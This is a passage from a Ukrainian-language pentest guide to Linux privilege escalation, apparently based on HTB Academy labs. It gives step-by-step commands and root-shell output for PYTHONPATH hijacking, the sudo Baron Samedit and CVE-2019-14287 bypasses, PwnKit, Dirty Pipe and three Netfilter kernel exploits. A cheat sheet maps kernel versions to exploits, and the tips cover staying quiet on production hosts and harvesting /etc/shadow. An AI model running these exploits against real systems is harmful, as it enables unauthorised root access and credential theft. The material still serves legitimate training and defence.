- 🔍 **ПОШУК:** `uid=0(root)` у першому рядку — наш код виконано як root. Трейсбек — наслідок того, що підробка не повертає справжній об'єкт, але це вже після отримання виконання.

## 6.3. PYTHONPATH Environment Variable

Якщо sudoers містить **`SETENV:`** для Python, ми можемо самостійно задати `PYTHONPATH` перед запуском і вказати довільну теку для імпорту.

### Крок 1. Перевірити sudo-права

```bash
sudo -l
```

```
Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:...

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

- 🔍 **ПОШУК:** **`SETENV:`** — можемо задавати змінні середовища для sudo-запуску. **`NOPASSWD:`** — без пароля.

### Крок 2. Запуск із кастомним PYTHONPATH

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

```
uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

Ми перемістили підроблений `psutil.py` у `/tmp`, і вказали його як `PYTHONPATH`. Python шукає `psutil` спочатку в `/tmp`, знаходить наш і виконує його код від root.

---

# 7. Sudo: CVE-2021-3156 + CVE-2019-14287

**sudo** дозволяє запускати процеси з правами іншого користувача. Файл `/etc/sudoers` визначає, хто які команди може запускати. Є два важливі CVE на privesc.

## 7.1. Огляд конфігурації

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

```
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:..."
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

- 🔍 **ПОШУК:** дозволи на конкретні команди, `env_keep`, групи. Рядок `cry0l1t3 ALL=(ALL) /usr/bin/id` — потенційний кандидат для CVE-2019-14287.

## 7.2. CVE-2021-3156 (Baron Samedit)

Heap-based buffer overflow у sudo. Вражені версії:
- **1.8.31** (Ubuntu 20.04)
- **1.8.27** (Debian 10)
- **1.9.2** (Fedora 33) та інші

Вразливість була прихована більше **10 років**.

### Крок 1. Дізнатися версію sudo

```bash
sudo -V | head -n1
```

```
Sudo version 1.8.31
```

- 🔍 **ПОШУК:** значення версії, яке входить до переліку вразливих.

### Крок 2. Завантажити PoC

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
```

```bash
cd CVE-2021-3156
```

```bash
make
```

```
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

- 🔍 **ПОШУК:** успішну компіляцію без помилок + створення `sudo-hax-me-a-sandwich`.

### Крок 3. Побачити список цілей

```bash
./sudo-hax-me-a-sandwich
```

```
** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

### Крок 4. Підібрати ID цілі (уточнити ОС)

```bash
cat /etc/lsb-release
```

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

- 🔍 **ПОШУК:** збіг `DISTRIB_DESCRIPTION` із target ID зі списку (тут `1`).

### Крок 5. Запустити з потрібним target

```bash
./sudo-hax-me-a-sandwich 1
```

```
** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

- 🔍 **ПОШУК:** `pray for your rootshell` + `# id` + `uid=0(root)` — успіх.

## 7.3. CVE-2019-14287 (Sudo Policy Bypass)

Вражає всі версії **нижче 1.8.28**. Потребує лише однієї умови: користувач має дозвіл на конкретну команду через sudo з `(ALL)`.

### Крок 1. Перевірити дозволи

```bash
sudo -l
```

```
User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

- 🔍 **ПОШУК:** рядок виду `(ALL) /path/to/command`.

### Крок 2. Знайти UID користувача

```bash
cat /etc/passwd | grep cry0l1t3
```

```
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

### Крок 3. Запустити з UID -1 (перетворюється на 0 = root)

```bash
sudo -u#-1 id
```

```
root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

- 🔍 **ПОШУК:** `uid=0(root)` — при тому, що GID ще належить оригінальному користувачу. Це особливість трюку: UID=-1 парситься як 0, але GID не змінюється.

---

# 8. Polkit / PwnKit (CVE-2021-4034)

**PolicyKit (polkit)** — сервіс авторизації в Linux. Дозволяє користувацьким програмам і системним компонентам взаємодіяти, якщо ПЗ має на це право. Файли polkit:

- `/usr/share/polkit-1/actions` — actions/policies
- `/usr/share/polkit-1/rules.d` — rules
- `/etc/polkit-1/localauthority/50-local.d` — кастомні `.pkla` правила

Polkit постачає три програми:
- **`pkexec`** — запускає програму з правами іншого користувача/root
- **`pkaction`** — показує actions
- **`pkcheck`** — перевіряє, чи процес авторизований для дії

## Штатний виклик pkexec

```bash
pkexec -u root id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

- 🔍 **ПОШУК:** виконання з `uid=0` без пароля — ознака слабкої конфігурації (рідко); або просто сама наявність pkexec у `/usr/bin`.

## CVE-2021-4034 (PwnKit)

Memory corruption у `pkexec`. Вразливість була прихована понад **10 років**. Публічно оголошена в листопаді 2021, виправлена через два місяці.

### Крок 1. Завантажити PoC

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
```

```bash
cd CVE-2021-4034
```

```bash
gcc cve-2021-4034-poc.c -o poc
```

- 🔍 **ПОШУК:** успішна компіляція без помилок; створення бінара `poc`.

### Крок 2. Запустити

```bash
./poc
```

```
# id

uid=0(root) gid=0(root) groups=0(root)
```

- 🔍 **ПОШУК:** промпт `#` — shell root; `id` підтверджує. Після запуску може бути `sh` (не bash) — перейти в bash командою `bash`.

---

# 9. Dirty Pipe (CVE-2022-0847)

Вразливість у ядрі Linux, що дозволяє неавторизований запис у файли root. Технічно подібна до **Dirty COW (CVE-2016-5195)**. Вражає всі ядра від **5.8 до 5.17**. Android-телефони теж вражені.

Суть: користувач може писати в довільні файли, якщо має право *читати* ці файли. Вразливість ґрунтується на pipes (односпрямоване спілкування між процесами).

## Крок 1. Завантажити exploit

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

```bash
cd CVE-2022-0847-DirtyPipe-Exploits
```

```bash
bash compile.sh
```

- 🔍 **ПОШУК:** успішна компіляція двох варіантів `exploit-1` і `exploit-2`.

## Крок 2. Перевірити версію ядра

```bash
uname -r
```

```
5.13.0-46-generic
```

- 🔍 **ПОШУК:** версія в діапазоні 5.8–5.17.

## Крок 3. Варіант 1 — підмінити пароль root у /etc/passwd

```bash
./exploit-1
```

```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

- 🔍 **ПОШУК:** повідомлення про backup/restore passwd та shell від root.

## Крок 4. Варіант 2 — hijack SUID-бінара

### 4.1. Знайти SUID-бінарі

```bash
find / -perm -4000 2>/dev/null
```

- ⏳ **ОЧІКУВАННЯ:** команда обходить всю ФС — може зайняти час, особливо на великих системах.

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

- 🔍 **ПОШУК:** будь-який SUID-бінар root.

### 4.2. Запустити exploit з повним шляхом до бінара

```bash
./exploit-2 /usr/bin/sudo
```

```
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```

- 🔍 **ПОШУК:** чотири рядки `[+] ...`, потім root-shell. Не забути прибрати `/tmp/sh`!

> 📝 **ПРИМІТКА.** Обов'язково почистити `/tmp/sh` після post-exploit — це сам PoC нагадує.

---

# 10. Netfilter: CVE-2021-22555 / CVE-2022-25636 / CVE-2023-32233

**Netfilter** — модуль ядра Linux, що забезпечує фільтрацію пакетів, NAT та інші fw-функції. Через нього працюють `iptables`/`arptables`. Три основні функції: дефрагментація пакетів, трекінг з'єднань, NAT. В 2021, 2022 і 2023 роках у Netfilter знайдено кілька privesc-вразливостей.

> ⚠️ **УВАГА.** Ці експлойти дуже нестабільні і можуть зламати ядро. Перед запуском — snapshot VM.

## 10.1. CVE-2021-22555

Вразливі ядра: **2.6 – 5.11**.

### Крок 1. Перевірити версію ядра

```bash
uname -r
```

```
5.10.5-051005-generic
```

- 🔍 **ПОШУК:** версія в діапазоні 2.6–5.11.

### Крок 2. Завантажити, скомпілювати, запустити

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

```bash
gcc -m32 -static exploit.c -o exploit
```

```bash
./exploit
```

```
[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...

[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[*] Searching for corrupted primary message...
[+] fake_idx: fff
[+] real_idx: fdf
...SNIP...

root@ubuntu:/home/cry0l1t3# id

uid=0(root) gid=0(root) groups=0(root)
```

- ⏳ **ОЧІКУВАННЯ:** експлойт проходить через кілька стадій (`STAGE 0..N`) — спрей повідомлень може зайняти час. Не перериати.
- 🔍 **ПОШУК:** переходи `STAGE`, `root@...# id` + `uid=0(root)`.

## 10.2. CVE-2022-25636

Вражає ядра **5.4 – 5.6.10**. Файл `net/netfilter/nf_dup_netdev.c`, heap out-of-bounds write.

### Крок 1. Перевірити версію

```bash
uname -r
```

```
5.13.0-051300-generic
```

> ⚠️ **УВАГА.** Цей exploit може пошкодити ядро — для відновлення потрібен **reboot**.

### Крок 2. Завантажити і скомпілювати

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
```

```bash
cd CVE-2022-25636
```

```bash
make
```

### Крок 3. Запустити

```bash
./exploit
```

```
[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000

[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
[+] net_device struct freed

[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] obtained net_device struct

[*] STEP 4: Leak kaslr
[*] kaslr leak: 0xffffffff823093c0
[*] kaslr base: 0xffffffff80ffefa0

[*] STEP 5: Release setxattrs, free net_device, and realloc it again
[+] obtained net_device struct

[*] STEP 6: rop :)

# id

uid=0(root) gid=0(root) groups=0(root)
```

- ⏳ **ОЧІКУВАННЯ:** 6 стадій (`STEP 1..6`) з leak-ами KASLR і ROP — може зайняти час. Чекай.
- 🔍 **ПОШУК:** перехід через усі 6 `STEP` + `# id` + `uid=0(root)`.

## 10.3. CVE-2023-32233

Use-After-Free у anonymous sets `nf_tables`. Вражає ядра **до 6.3.1**. Anonymous sets — тимчасові робочі області для батч-запитів; через помилку вони продовжують бути доступними після очищення.

### Крок 1. Завантажити і скомпілювати

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
```

```bash
cd CVE-2023-32233
```

```bash
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

- 🔍 **ПОШУК:** успішна компіляція; наявність системних бібліотек `libmnl` і `libnftnl` (можуть потребувати встановлення: `apt install libmnl-dev libnftnl-dev`).

### Крок 2. Запустити

```bash
./exploit
```

```
[*] Netfilter UAF exploit

Using profile:
========
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
========

[*] Checking for available CPUs...
[*] sched_getaffinity() => 0 2
[*] Reserved CPU 0 for PWN Worker
[*] Started cpu_spinning_loop() on CPU 1
[*] Started cpu_spinning_loop() on CPU 2
[*] Started cpu_spinning_loop() on CPU 3
[*] Creating "/tmp/modprobe"...
[*] Creating "/tmp/trigger"...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting for PWN Worker...

...SNIP...

[*] You've Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)
```

- ⏳ **ОЧІКУВАННЯ:** race condition — особливо довгий. Пройдуть `initial_sleep 4000 ms`, потім цикли `lead_sleep`/`lag_sleep`/`reuse_sleep`. Чекати спокійно. Може знадобитися кілька спроб.
- 🔍 **ПОШУК:** `You've Got ROOT:-)` + `uid=0(root)`.

> 📝 **ПРИМІТКА.** Якщо exploit падає або не спрацьовує — запустити ще раз 2-3 рази (race-умова).

---

# 11. Підсумкова шпаргалка

Короткий quick-reference для найшвидшого початку.

## Мінімальний чекліст enumeration (5 хвилин)

```bash
uname -a
uname -r
cat /etc/lsb-release
sudo -V | head -n1
sudo -l
find / -perm -4000 2>/dev/null
id
cat /etc/passwd
```

## Матриця "версія ядра → CVE"

| Версія ядра / ПЗ | Вразливість | Розділ |
|:---|:---|:---:|
| Kernel 2.6 — 5.11 | CVE-2021-22555 (Netfilter) | [10.1](#101-cve-2021-22555) |
| Kernel 5.4 — 5.6.10 | CVE-2022-25636 (Netfilter) | [10.2](#102-cve-2022-25636) |
| Kernel 5.8 — 5.17 | CVE-2022-0847 (Dirty Pipe) | [9](#9-dirty-pipe-cve-2022-0847) |
| Kernel до 6.3.1 | CVE-2023-32233 (Netfilter UAF) | [10.3](#103-cve-2023-32233) |
| sudo 1.8.31 / 1.8.27 / 1.9.2 | CVE-2021-3156 (Baron Samedit) | [7.2](#72-cve-2021-3156-baron-samedit) |
| sudo < 1.8.28 | CVE-2019-14287 (Policy Bypass) | [7.3](#73-cve-2019-14287-sudo-policy-bypass) |
| pkexec (усі версії до 01.2022) | CVE-2021-4034 (PwnKit) | [8](#8-polkit--pwnkit-cve-2021-4034) |
| Kernel 4.x / 2016+ | Dirty COW CVE-2016-5195 | [3](#3-експлуатація-ядра-kernel-exploits) |

## Матриця "знахідка в перерахуванні → вектор"

| Що побачив у оутпуті | Який вектор | Розділ |
|:---|:---|:---:|
| `env_keep+=LD_PRELOAD` у `sudo -l` | LD_PRELOAD hijacking | [4](#4-shared-libraries-і-ld_preload) |
| `SETENV:` для python у `sudo -l` | PYTHONPATH hijacking | [6.3](#63-pythonpath-environment-variable) |
| `(ALL) /usr/bin/cmd` у `sudo -l`, sudo<1.8.28 | `sudo -u#-1` trick | [7.3](#73-cve-2019-14287-sudo-policy-bypass) |
| SUID-бінар з кастомною `.so` (ldd) | Shared Object Hijacking | [5](#5-shared-object-hijacking-runpath) |
| `RUNPATH` у readelf + writable тека | RUNPATH hijacking | [5](#5-shared-object-hijacking-runpath) |
| Writable модуль Python + SUID-скрипт | Python module write | [6.1](#61-wrong-write-permissions) |
| Writable тека в `sys.path` + SUID Python | Python library path | [6.2](#62-library-path) |
| `pkexec` існує в `/usr/bin` (до 01.2022) | PwnKit | [8](#8-polkit--pwnkit-cve-2021-4034) |
| Ядро 5.8-5.17 + SUID-бінарі | Dirty Pipe | [9](#9-dirty-pipe-cve-2022-0847) |

## Фінальні поради

1. Завжди підтверджуй ескалацію: `whoami` + `id`.
2. Після Dirty Pipe — прибирай `/tmp/sh`.
3. Kernel-exploit'и — тільки на snapshot VM. Може впасти ядро.
4. На продакшні — мінімізуй шум: жодних `git clone` у `/home`; використовуй `/tmp` або `/dev/shm`.
5. Після privesc — шукай credentials у `/etc/shadow`, `/root/`, history.
6. Записуй усе, що виконуєш — для звіту клієнту.

---

## 📚 Корисні посилання

- [GTFOBins](https://gtfobins.github.io/) — база бінарів, які можна зловживати
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) — автоматизоване перерахування
- [PayloadsAllTheThings — Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

---

> **Disclaimer:** Цей матеріал призначений виключно для освітніх цілей, сертифікованих пентестерів та bug bounty researchers. Використання цих технік проти систем без письмового дозволу власника є незаконним у більшості юрисдикцій.
